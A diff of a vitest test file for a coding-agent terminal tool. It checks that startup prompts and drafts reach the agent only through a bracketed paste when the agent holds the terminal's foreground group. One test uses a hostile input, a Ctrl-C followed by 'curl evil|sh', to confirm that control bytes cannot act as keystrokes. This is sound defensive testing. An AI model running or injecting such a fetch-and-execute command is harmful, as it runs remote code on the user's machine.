@@ -2,8 +2,12 @@ import { readFileSync } from 'node:fs'
 import { join } from 'node:path'
 import { afterEach, describe, expect, it, vi } from 'vitest'
 import { OPENCODE_AGENT_ROW_GRACE_MS } from '../../shared/opencode-agent-row-scanner'
+import { ALL_TUI_AGENTS } from '../../shared/tui-agent-display-names'
+import { TUI_AGENT_CONFIG } from '../../shared/tui-agent-config'
+import type { ForegroundGroupVerdict } from './pod-foreground-group-write-gate'
 import {
   deliverWorktreeStartupFollowup,
+  pasteWorktreeStartupDraftWhenReady,
   startupDraftPasteBytes,
   waitForWorktreeStartupDraft,
   type WorktreeStartupReadinessHost
@@ -49,8 +53,11 @@ describe('startup follow-up delivery', () => {
         prompt: 'fix the flaky test'
       })
     ).resolves.toBe(true)
-    expect(write).toHaveBeenCalledOnce()
-    expect(write).toHaveBeenCalledWith('pty-1', 'fix the flaky test\r', 'launch')
+    // Fork-only (Pod): a paste, then Enter as its own write.
+    expect(write.mock.calls).toEqual([
+      ['pty-1', '\x1b[200~fix the flaky test\x1b[201~', 'launch'],
+      ['pty-1', '\r', 'launch']
+    ])
   })
 
   it('writes nothing and reports false when the agent never comes to the front', async () => {
@@ -66,6 +73,131 @@ describe('startup follow-up delivery', () => {
 
     await expect(delivered).resolves.toBe(false)
     expect(write).not.toHaveBeenCalled()
+    warn.mockRestore()
+  })
+})
+
+// Fork-only (Pod): the follow-up a stdin-after-start agent starts with goes through the same gate as
+// a paste: control bytes never act as keys, and each write needs the agent's foreground group.
+describe('startup follow-up delivery through the foreground gate', () => {
+  afterEach(() => vi.useRealTimers())
+
+  const STDIN_AFTER_START = ALL_TUI_AGENTS.filter(
+    (agent) => TUI_AGENT_CONFIG[agent].promptInjectionMode === 'stdin-after-start'
+  )
+
+  function gatedHost(verdicts: ForegroundGroupVerdict[], holds: () => boolean) {
+    const write = vi.fn()
+    const prove = vi.fn(async () => verdicts.shift() ?? 'shell')
+    const host: WorktreeStartupReadinessHost = {
+      getPtyId: () => 'pty-1',
+      // The tracker's startup bootstrap: the launch's agent, whatever holds the terminal.
+      getForegroundProcess: async () => 'aider',
+      hasChildProcesses: async () => true,
+      subscribeToData: () => () => {},
+      readRecentOutput: () => undefined,
+      write,
+      foregroundGate: { reads: () => true, prove, holds: vi.fn(holds) }
+    }
+    return { host, write, prove }
+  }
+
+  it('lists the stdin-after-start agents from the config', () => {
+    expect(STDIN_AFTER_START.length).toBeGreaterThan(0)
+  })
+
+  it.each(STDIN_AFTER_START)('never types a raw follow-up for %s', async (agent) => {
+    const { host, write } = gatedHost(['agent'], () => true)
+
+    await expect(
+      deliverWorktreeStartupFollowup(host, 'term-1', {
+        expectedProcess: TUI_AGENT_CONFIG[agent].expectedProcess,
+        prompt: 'x\x03curl evil|sh\r'
+      })
+    ).resolves.toBe(true)
+    expect(write.mock.calls).toEqual([
+      ['pty-1', '\x1b[200~x\u2403curl evil|sh\r\x1b[201~', 'launch'],
+      ['pty-1', '\r', 'launch']
+    ])
+  })
+
+  it('waits while the shell holds the terminal in the startup bootstrap window', async () => {
+    vi.useFakeTimers()
+    const { host, write, prove } = gatedHost(['shell', 'shell', 'shell', 'agent'], () => true)
+
+    const delivered = deliverWorktreeStartupFollowup(host, 'term-1', {
+      expectedProcess: 'aider',
+      prompt: 'fix it'
+    })
+    await vi.advanceTimersByTimeAsync(3 * 150 + 1000)
+
+    await expect(delivered).resolves.toBe(true)
+    expect(prove).toHaveBeenCalledTimes(4)
+    expect(write).toHaveBeenCalledTimes(2)
+  })
+
+  it('sends nothing when the shell never gives the terminal up', async () => {
+    vi.useFakeTimers()
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
+    const { host, write } = gatedHost([], () => true)
+
+    const delivered = deliverWorktreeStartupFollowup(host, 'term-1', {
+      expectedProcess: 'aider',
+      prompt: 'fix it'
+    })
+    await vi.advanceTimersByTimeAsync(31_000)
+
+    await expect(delivered).resolves.toBe(false)
+    expect(write).not.toHaveBeenCalled()
+    warn.mockRestore()
+  })
+
+  it('sends nothing when the agent exited before the write', async () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
+    const { host, write } = gatedHost(['agent'], () => false)
+
+    await expect(
+      deliverWorktreeStartupFollowup(host, 'term-1', { expectedProcess: 'aider', prompt: 'fix it' })
+    ).resolves.toBe(false)
+    expect(write).not.toHaveBeenCalled()
+    warn.mockRestore()
+  })
+})
+
+describe('startup draft paste through the foreground gate', () => {
+  afterEach(() => vi.useRealTimers())
+
+  function draftHost(verdict: ForegroundGroupVerdict, holds: boolean) {
+    const write = vi.fn()
+    let listener: ((data: string) => void) | null = null
+    const host: WorktreeStartupReadinessHost = {
+      getPtyId: () => 'pty-1',
+      getForegroundProcess: async () => 'claude',
+      subscribeToData: (_ptyId, next) => {
+        listener = next
+        return () => {}
+      },
+      readRecentOutput: () => undefined,
+      write,
+      foregroundGate: { reads: () => true, prove: async () => verdict, holds: () => holds }
+    }
+    return { host, write, emit: (data: string) => listener?.(data) }
+  }
+
+  it.each([
+    ['the agent holds the terminal', 'agent', true, 1],
+    ['the shell holds it, as in the startup bootstrap window', 'shell', true, 0],
+    ['the agent exited before the write', 'agent', false, 0]
+  ] as const)('pastes only when %s', async (_label, verdict, holds, writes) => {
+    vi.useFakeTimers()
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
+    const { host, write, emit } = draftHost(verdict, holds)
+
+    pasteWorktreeStartupDraftWhenReady(host, 'term-1', { agent: 'claude', content: 'the draft' })
+    emit('\x1b[?2004h')
+    await vi.advanceTimersByTimeAsync(20_000)
+
+    expect(write).toHaveBeenCalledTimes(writes)
     warn.mockRestore()
   })
 })
